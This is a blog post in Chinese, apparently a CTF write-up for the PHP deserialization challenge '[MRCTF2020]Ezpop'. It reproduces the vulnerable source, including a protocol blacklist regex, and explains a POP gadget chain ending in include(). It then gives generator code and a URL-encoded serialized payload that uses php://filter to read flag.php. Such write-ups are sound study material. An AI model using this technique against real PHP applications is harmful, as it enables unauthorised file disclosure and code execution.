@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>[MRCTF2020]Ezpop | 小巷幽梦</title><meta name="author" content="小巷幽梦"><meta name="copyright" content="小巷幽梦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="WP打开题目  1234567if(isset($_GET[&amp;#x27;pop&amp;#x27;]))&amp;#123;@unserialize($_GET[&amp;#x27;pop&amp;#x27;]);&amp;#125;else&amp;#123;$a&#x3D;new Show;highlight_file(__FILE__);&amp;#125; 一眼望去全是类，反序列化没得跑 审计代码1234567if(isset($_GET[&amp;#x27;p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[MRCTF2020]Ezpop">
+<meta property="og:url" content="http://example.com/2022/04/04/[MRCTF2020]Ezpop/index.html">
+<meta property="og:site_name" content="小巷幽梦">
+<meta property="og:description" content="WP打开题目  1234567if(isset($_GET[&amp;#x27;pop&amp;#x27;]))&amp;#123;@unserialize($_GET[&amp;#x27;pop&amp;#x27;]);&amp;#125;else&amp;#123;$a&#x3D;new Show;highlight_file(__FILE__);&amp;#125; 一眼望去全是类，反序列化没得跑 审计代码1234567if(isset($_GET[&amp;#x27;p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/time.jpg">
+<meta property="article:published_time" content="2022-04-04T08:03:01.303Z">
+<meta property="article:modified_time" content="2022-04-04T14:28:13.040Z">
+<meta property="article:author" content="小巷幽梦">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/time.jpg"><link rel="shortcut icon" href="/img/%E5%9B%BE%E6%A0%87.jpg"><link rel="canonical" href="http://example.com/2022/04/04/[MRCTF2020]Ezpop/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 小巷幽梦","link":"链接: ","source":"来源: 小巷幽梦","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[MRCTF2020]Ezpop',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-04 22:28:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="小巷幽梦" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/time.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">小巷幽梦</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[MRCTF2020]Ezpop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-04T08:03:01.303Z" title="发表于 2022-04-04 16:03:01">2022-04-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-04T14:28:13.040Z" title="更新于 2022-04-04 22:28:13">2022-04-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="[MRCTF2020]Ezpop"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h3><img src="https://bu.dusays.com/2022/04/04/3c8f6116d3fea.png" alt="img" style="zoom: 25%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">@unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=new Show;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一眼望去全是类，反序列化没得跑</p>
+<h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">@unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=new Show;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不出所料，unserialize，pop链<br>有unserialize，直接找wakeup魔法方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">	public <span class="variable">$source</span>;</span><br><span class="line">	public <span class="variable">$str</span>;</span><br><span class="line">	public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable">$this</span>-&gt;<span class="built_in">source</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$this</span>-&gt;str-&gt;<span class="built_in">source</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wakeup魔法方法进行了过滤，..&#x2F;和一些协议不能用d<br>暂时想到filter读取，先往下看        &#x2F;&#x2F;***<br>wakeup触发后是一个正则匹配好像没什么用，看看同类的其他方法和属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$this</span>-&gt;str-&gt;<span class="built_in">source</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tostring映入眼帘，即将对象当做字符使用时调用<br>然后返回一个属性的属性，暂时不懂<br>整理思路，从头看第一个类</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">protected  <span class="variable">$var</span>;</span><br><span class="line">public <span class="keyword">function</span> append(<span class="variable">$value</span>)&#123;</span><br><span class="line">	include(<span class="variable">$value</span>);		</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line"><span class="variable">$this</span>-&gt;append(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件包含读取源码，这我熟啊，再加上题目上的提示（flag is in flag.php），构造var&#x3D;’php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php’;<br>现在考虑怎么执行这个append方法，下面正好有个__invoke()魔法方法<br>即当对象被当做函数使用时执行这个方法<br>那怎么样将这个类当做函数使用呢，先放着            &#x2F;&#x2F;***<br>看最后一个类</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">	public <span class="variable">$p</span>;</span><br><span class="line">	public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;p = array();</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="keyword">function</span> __get(<span class="variable">$key</span>)&#123;</span><br><span class="line">		<span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>__get()魔法方法：在对象外访问私有属性时调用<br>也就是访问一个类中不存在而另一个类存在的属性即可</p>
+<p>类看完了，开始逆推<br>执行append($var) -&gt; 调用魔法方法__invoke() -&gt; 将Modifier当做函数使用 -&gt;<br>在Test类触发__get() -&gt; 在Test类中访问一个只存在于其他类的变量，即source -&gt;<br>如何调用Test类，想到可控变量str，即toString方法的return $this-&gt;str-&gt;source; -&gt;<br>如何调用Tostring，当对象被当做字符串处理时,即this-&gt;source为show类的实例对象-&gt;<br>将str实例化为Test对象<br>整理，也就是：<br>$flag &#x3D; new Show();<br>$flag -&gt; str &#x3D; new Test();<br>$flag -&gt; str -&gt; p &#x3D; new Modifier();<br>$flag_1 &#x3D; new Show($flag);<br>源码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&#x27;kkk&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="variable">$p</span>;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = new Show();</span><br><span class="line"><span class="variable">$flag</span>-&gt;str= new Test();</span><br><span class="line"><span class="variable">$flag</span>-&gt;str-&gt;p = new Modifier();</span><br><span class="line"><span class="variable">$flag_1</span>= new Show(<span class="variable">$flag</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$flag_1</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果：<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p>
+<p>payload:<br>pop&#x3D;O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D    </p>
+<p>得到PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezU0ZjY2MWVjLTZhM2EtNDlkMS04YzVhLWJlNjU2ZWFmYzk2NX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8<br>这么多大写，先试试base64</p>
+<img src="https://bu.dusays.com/2022/04/04/3c8f6116d3fea.png" alt="img" style="zoom:33%;" />
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">小巷幽梦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/04/04/[MRCTF2020]Ezpop/">http://example.com/2022/04/04/[MRCTF2020]Ezpop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">小巷幽梦</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/time.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/04/04/%E4%BD%90%E5%8A%A9/"><img class="prev-cover" src="/img/%E4%BD%90%E5%8A%A9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">佐助</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">小巷幽梦</div><div class="author-info__description">这是小巷的博客</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WP"><span class="toc-number">1.</span> <span class="toc-text">WP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">打开题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">审计代码</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/04/04/%E4%BD%90%E5%8A%A9/" title="佐助"><img src="/img/%E4%BD%90%E5%8A%A9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="佐助"/></a><div class="content"><a class="title" href="/2022/04/04/%E4%BD%90%E5%8A%A9/" title="佐助">佐助</a><time datetime="2022-04-04T11:24:28.103Z" title="发表于 2022-04-04 19:24:28">2022-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/04/%5BMRCTF2020%5DEzpop/" title="[MRCTF2020]Ezpop"><img src="/img/time.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[MRCTF2020]Ezpop"/></a><div class="content"><a class="title" href="/2022/04/04/%5BMRCTF2020%5DEzpop/" title="[MRCTF2020]Ezpop">[MRCTF2020]Ezpop</a><time datetime="2022-04-04T08:03:01.303Z" title="发表于 2022-04-04 16:03:01">2022-04-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/time.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 小巷幽梦</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
